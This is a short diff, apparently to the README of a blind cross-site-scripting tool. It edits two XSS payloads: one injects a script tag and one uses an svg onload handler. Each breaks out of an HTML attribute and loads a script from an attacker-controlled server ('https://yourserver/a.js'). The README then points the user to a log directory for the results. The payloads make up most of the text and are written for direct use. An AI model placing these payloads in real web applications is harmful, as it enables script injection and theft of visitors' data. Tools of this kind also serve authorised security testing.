@@ -17,11 +17,11 @@ sudo bash start.sh start &
 
 * send the script in a xss:
 ```html
-'"><script/src=https://yourserver/a.js></script>
+'"><script/src=https://yourserver/a.js></script><"'
 ```
 
 ```html
-'"><svg/onload=body.appendChild(document.createElement`script`).src="https://yourserver/a.js">
+'"><svg/onload=body.appendChild(document.createElement`script`).src="https://yourserver/a.js"><"'
 ```
 
 * see the log directory
